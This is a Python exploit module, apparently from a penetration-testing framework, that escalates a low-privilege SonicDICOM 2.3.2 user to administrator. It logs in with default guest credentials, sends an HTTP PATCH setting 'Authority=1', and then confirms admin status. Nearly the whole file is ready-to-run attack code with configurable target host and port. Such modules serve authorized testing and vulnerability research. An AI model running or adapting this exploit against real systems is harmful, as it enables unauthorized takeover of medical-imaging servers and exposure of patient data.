#!/usr/bin/env python
import urllib2
import cookielib
from cStringIO import StringIO
import json
import gzip
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_sonicDICOM_privilege_escalation"
INFO['DESCRIPTION'] = "SonicDICOM Privilege Escalation"
INFO['VENDOR'] = "https://sonicdicom.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    The application suffers from a privilege escalation vulnerability. Normal user can elevate his/her privileges by
sending a HTTP PATCH request seting the parameter 'Authority' to integer value '1' gaining admin rights.
Tested against SonicDICOM 2.3.2 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://sonicdicom.com/download/"
INFO["LINKS"] = ["http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5396.php"]
INFO['CHANGELOG'] = "13 Jun, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["BASEPATH"] = "viewer"
OPTIONS["USERNAME"] = "guest"
OPTIONS["PASSWORD"] = "guest"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.basepath = self.args.get("BASEPATH", OPTIONS["BASEPATH"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])

    def make_url(self, path=''):
        url = 'http://{}:{}/{}/'.format(self.host, self.port, self.basepath) + path
        return url

    def login(self):
        self.log('[*] Trying to login')
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        login_url = self.make_url('login')
        data = 'id={}&password={}'.format(self.username, self.password)
        res = opener.open(login_url, data).read()
        self.log('[+] User {} successfully logged in'.format(self.username))
        self.opener = opener

    def run(self):
        #Get options from gui
        self.args()
        self.login()
        self.log('[*] Changing priveleges')
        data = "Id={}&Authority=1".format(self.username)
        request = urllib2.Request(self.make_url('api/accounts/update'), data)
        request.get_method = lambda: 'PATCH'
        self.opener.open(request)
        res = self.opener.open(self.make_url('api/accounts/signed'))
        if res.info().get('Content-Encoding') == 'gzip':
            buf = StringIO(res.read())
            f = gzip.GzipFile(fileobj=buf)
            data = f.read()
        else:
            data = res.read()
        res = json.loads(data)
        if res.get("Authority"):
            self.log('[+] User {} is an administrator now'.format(self.username))
            self.finish(True)
        self.finish(False)

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()